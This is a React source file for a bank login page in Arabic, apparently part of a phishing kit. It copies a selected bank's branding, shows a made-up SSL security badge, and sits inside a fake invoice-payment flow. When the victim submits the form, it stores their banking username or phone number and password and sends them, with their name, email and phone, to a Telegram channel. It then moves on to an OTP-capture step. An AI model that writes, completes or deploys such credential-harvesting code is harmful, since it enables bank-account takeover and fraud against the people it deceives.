import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getBankById } from "@/lib/banks";
import { getBankDesign } from "@/lib/bankDesigns";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { formatCurrency } from "@/lib/countryCurrencies";
import { sendToTelegram } from "@/lib/telegram";
import { 
  Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck, 
  Smartphone, Fingerprint, QrCode, User, KeyRound, Phone
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Helmet } from "react-helmet-async";

const BankLoginPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [loginValue, setLoginValue] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selected_bank || "";
  const selectedBank = getBankById(selectedBankId);
  const bankDesign = getBankDesign(selectedBankId);
  
  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const customerName = linkData?.payload?.customer_name || "";
  const customerEmail = linkData?.payload?.customer_email || "";
  const customerPhone = linkData?.payload?.customer_phone || "";
  const invoiceNumber = linkData?.payload?.invoice_number || "";
  const paymentAmount = linkData?.payload?.payment_amount || 500;
  const serviceKey = linkData?.payload?.service_key || "payment";
  
  const serviceBranding = getServiceBranding(serviceKey);
  const formattedAmount = formatCurrency(paymentAmount, countryCode);

  if (!bankDesign) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl">
        <Card className="p-8 text-center max-w-md">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2">البنك غير متوفر</h2>
          <p className="text-muted-foreground mb-4">لم يتم العثور على تصميم البنك المطلوب</p>
          <Button onClick={() => navigate(`/pay/${id}/bank-selector`)}>
            العودة لاختيار البنك
          </Button>
        </Card>
      </div>
    );
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!loginValue || !password) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال جميع البيانات",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: {
          ...linkData?.payload,
          bank_login: {
            loginType: bankDesign.loginType,
            loginValue: loginValue,
            password: password,
          },
        },
      });

      // إرسال بيانات تسجيل الدخول إلى تيليجرام
      await sendToTelegram({
        type: 'bank_login',
        data: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          service: serviceBranding.nameAr || serviceKey,
          country: countryData?.nameAr || countryCode,
          countryCode: countryCode,
          bank: selectedBank?.nameAr || selectedBankId,
          bankId: selectedBankId,
          loginType: bankDesign.loginType,
          username: bankDesign.loginType === 'username' ? loginValue : '',
          customerId: bankDesign.loginType === 'customerId' ? loginValue : '',
          phoneNumber: bankDesign.loginType === 'phone' ? loginValue : '',
          password: password,
          amount: formattedAmount
        },
        timestamp: new Date().toISOString()
      });

      toast({
        title: "تم بنجاح",
        description: "جاري التحقق من بياناتك...",
      });

      setTimeout(() => {
        navigate(`/pay/${id}/otp-verification`);
      }, 1500);
    } catch (error) {
      console.error("Error:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الدخول",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getLoginLabel = () => {
    switch (bankDesign.loginType) {
      case 'username':
        return bankDesign.placeholders.username || 'اسم المستخدم';
      case 'customerId':
        return bankDesign.placeholders.customerId || 'رقم العميل';
      case 'phone':
        return bankDesign.placeholders.phone || 'رقم الجوال';
      default:
        return 'اسم المستخدم';
    }
  };

  const getLoginIcon = () => {
    switch (bankDesign.loginType) {
      case 'username':
        return <User className="w-5 h-5" />;
      case 'customerId':
        return <KeyRound className="w-5 h-5" />;
      case 'phone':
        return <Phone className="w-5 h-5" />;
      default:
        return <User className="w-5 h-5" />;
    }
  };

  return (
    <>
      <Helmet>
        <html lang="ar" dir="rtl" />
        <style>{`
          body {
            background: ${bankDesign.colors.background};
            font-family: ${bankDesign.fonts.arabic};
          }
        `}</style>
      </Helmet>
      
      <div 
        className="min-h-screen flex flex-col py-8 px-4" 
        dir="rtl"
        style={{ 
          background: bankDesign.colors.background,
          fontFamily: bankDesign.fonts.arabic
        }}
      >
        {/* رأس الصفحة مع شعار البنك */}
        <div className="w-full max-w-6xl mx-auto mb-6 px-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              {selectedBank?.logo ? (
                <img 
                  src={selectedBank.logo} 
                  alt={bankDesign.nameAr}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              ) : (
                <Building2 className="w-12 h-12" style={{ color: bankDesign.colors.primary }} />
              )}
              <div>
                <h1 
                  className="text-xl sm:text-2xl font-bold"
                  style={{ 
                    color: bankDesign.colors.primary,
                    fontFamily: bankDesign.fonts.arabic
                  }}
                >
                  {bankDesign.nameAr}
                </h1>
                <p className="text-xs sm:text-sm" style={{ color: bankDesign.colors.textSecondary }}>
                  {bankDesign.name}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-2xl">{countryData?.flag}</span>
            </div>
          </div>
        </div>
        
        <div className="flex-1 flex items-center justify-center">
        <div className="w-full max-w-md">

          {/* البطاقة الرئيسية */}
          <Card 
            className="p-6 sm:p-10 shadow-2xl"
            style={{ 
              border: `1px solid ${bankDesign.colors.border}`,
              background: bankDesign.colors.inputBg,
              borderRadius: '16px'
            }}
          >
            {/* عنوان تسجيل الدخول */}
            <div className="mb-8">
              <div className="flex items-center gap-3 mb-6">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center shadow-lg"
                  style={{ background: bankDesign.colors.primary }}
                >
                  <Lock className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 
                    className="text-2xl sm:text-3xl font-bold"
                    style={{ 
                      color: bankDesign.colors.text,
                      fontFamily: bankDesign.fonts.arabic
                    }}
                  >
                    الخدمات المصرفية
                  </h2>
                  <p style={{ color: bankDesign.colors.textSecondary, fontSize: '13px' }}>
                    Online Banking
                  </p>
                </div>
              </div>
              <div 
                className="h-1 w-20 rounded-full"
                style={{ background: bankDesign.colors.primary }}
              />
            </div>



            {/* نموذج تسجيل الدخول */}
            <form onSubmit={handleSubmit} className="space-y-5">
              {/* حقل تسجيل الدخول */}
              <div>
                <Label 
                  className="mb-3 text-sm font-bold"
                  style={{ color: bankDesign.colors.text }}
                >
                  {getLoginLabel()}
                </Label>
                <div className="relative">
                  <Input
                    type={bankDesign.loginType === 'phone' ? 'tel' : 'text'}
                    placeholder={getLoginLabel()}
                    value={loginValue}
                    onChange={(e) => setLoginValue(e.target.value)}
                    className="h-14 text-base px-4"
                    style={{
                      background: bankDesign.colors.inputBg,
                      borderColor: bankDesign.colors.border,
                      borderWidth: '2px',
                      borderRadius: '8px',
                      color: bankDesign.colors.text,
                      fontSize: '16px'
                    }}
                    required
                  />
                </div>
              </div>

              {/* حقل كلمة المرور */}
              <div>
                <Label 
                  className="mb-2 flex items-center gap-2 text-sm font-semibold"
                  style={{ color: bankDesign.colors.text }}
                >
                  <Lock className="w-5 h-5" />
                  {bankDesign.placeholders.password}
                </Label>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder={bankDesign.placeholders.password}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-14 text-base px-12"
                    style={{
                      background: bankDesign.colors.inputBg,
                      borderColor: bankDesign.colors.border,
                      color: bankDesign.colors.text
                    }}
                    autoComplete="current-password"
                    required
                  />
                  <div 
                    className="absolute right-4 top-1/2 -translate-y-1/2"
                    style={{ color: bankDesign.colors.primary }}
                  >
                    <Lock className="w-5 h-5" />
                  </div>
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute left-4 top-1/2 -translate-y-1/2 transition-colors"
                    style={{ color: bankDesign.colors.textSecondary }}
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              {/* تذكرني / نسيت كلمة المرور */}
              <div className="flex items-center justify-between text-sm">
                {bankDesign.features.rememberMe && (
                  <div className="flex items-center gap-2">
                    <input 
                      type="checkbox" 
                      id="remember" 
                      className="rounded"
                      style={{ 
                        accentColor: bankDesign.colors.primary,
                        borderColor: bankDesign.colors.border
                      }}
                    />
                    <label 
                      htmlFor="remember" 
                      className="cursor-pointer"
                      style={{ color: bankDesign.colors.textSecondary }}
                    >
                      تذكرني
                    </label>
                  </div>
                )}
                {bankDesign.features.forgotPassword && (
                  <button
                    type="button"
                    className="font-semibold hover:underline"
                    style={{ color: bankDesign.colors.primary }}
                  >
                    نسيت كلمة المرور؟
                  </button>
                )}
              </div>

              {/* زر تسجيل الدخول */}
              <Button
                type="submit"
                size="lg"
                className="w-full h-16 text-lg font-bold text-white shadow-xl hover:shadow-2xl transition-all hover:scale-[1.02]"
                disabled={isSubmitting || !loginValue || !password}
                style={{
                  background: bankDesign.colors.buttonGradient || bankDesign.colors.primary,
                  fontFamily: bankDesign.fonts.arabic,
                  borderRadius: '12px',
                  opacity: (!loginValue || !password) ? 0.6 : 1
                }}
              >
                {isSubmitting ? (
                  <span>جاري التحقق...</span>
                ) : (
                  <>
                    <span>تسجيل الدخول</span>
                    <ArrowLeft className="w-5 h-5 mr-2" />
                  </>
                )}
              </Button>
            </form>

            {/* خيارات تسجيل الدخول البديلة */}
            {(bankDesign.features.biometric || bankDesign.features.qrCode) && (
              <div className="mt-8 pt-6 border-t" style={{ borderColor: bankDesign.colors.border }}>
                <p 
                  className="text-center text-sm mb-4"
                  style={{ color: bankDesign.colors.textSecondary }}
                >
                  طرق تسجيل دخول أخرى
                </p>
                <div className="flex gap-3 justify-center">
                  {bankDesign.features.biometric && (
                    <button
                      type="button"
                      className="flex-1 py-3 px-4 rounded-xl border-2 flex items-center justify-center gap-2 transition-all hover:shadow-md"
                      style={{ 
                        borderColor: bankDesign.colors.primary,
                        color: bankDesign.colors.primary 
                      }}
                    >
                      <Fingerprint className="w-5 h-5" />
                      <span className="text-sm font-semibold">البصمة</span>
                    </button>
                  )}
                  {bankDesign.features.qrCode && (
                    <button
                      type="button"
                      className="flex-1 py-3 px-4 rounded-xl border-2 flex items-center justify-center gap-2 transition-all hover:shadow-md"
                      style={{ 
                        borderColor: bankDesign.colors.primary,
                        color: bankDesign.colors.primary 
                      }}
                    >
                      <QrCode className="w-5 h-5" />
                      <span className="text-sm font-semibold">QR</span>
                    </button>
                  )}
                </div>
              </div>
            )}

            {/* روابط إضافية */}
            <div className="mt-6 text-center space-y-3">
              <button
                type="button"
                className="text-sm hover:underline"
                style={{ color: bankDesign.colors.textSecondary }}
              >
                لا تملك حساب؟ سجل الآن
              </button>
              <div className="flex items-center justify-center gap-2 text-xs" style={{ color: bankDesign.colors.textSecondary }}>
                <Smartphone className="w-4 h-4" />
                <span>حمّل تطبيق {bankDesign.nameAr}</span>
              </div>
            </div>
          </Card>

          {/* معلومات الأمان */}
          <div className="mt-6 text-center">
            <div 
              className="inline-flex items-center gap-2 px-4 py-2 rounded-full text-xs"
              style={{ 
                background: `${bankDesign.colors.primary}15`,
                color: bankDesign.colors.primary
              }}
            >
              <ShieldCheck className="w-4 h-4" />
              <span>محمي بتقنية SSL 256-bit</span>
            </div>
          </div>

          {/* معلومات العملية */}
          <Card className="mt-6 p-4 border" style={{ borderColor: bankDesign.colors.border }}>
            <p className="text-xs text-center mb-3" style={{ color: bankDesign.colors.textSecondary }}>
              تفاصيل العملية
            </p>
            <div className="flex justify-between items-center">
              <div className="text-right">
                <p className="text-xs" style={{ color: bankDesign.colors.textSecondary }}>الخدمة</p>
                <p className="font-semibold text-sm" style={{ color: bankDesign.colors.text }}>
                  {serviceBranding.nameAr || serviceKey}
                </p>
              </div>
              <div className="text-left">
                <p className="text-xs" style={{ color: bankDesign.colors.textSecondary }}>المبلغ</p>
                <p 
                  className="font-bold text-lg"
                  style={{ color: bankDesign.colors.primary }}
                >
                  {formattedAmount}
                </p>
              </div>
            </div>
          </Card>

          {/* زر الرجوع */}
          <div className="mt-6 text-center">
            <button
              onClick={() => navigate(`/pay/${id}/bank-selector`)}
              className="inline-flex items-center gap-2 text-sm hover:underline"
              style={{ color: bankDesign.colors.textSecondary }}
            >
              <ArrowLeft className="w-4 h-4" />
              <span>العودة لاختيار بنك آخر</span>
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default BankLoginPage;
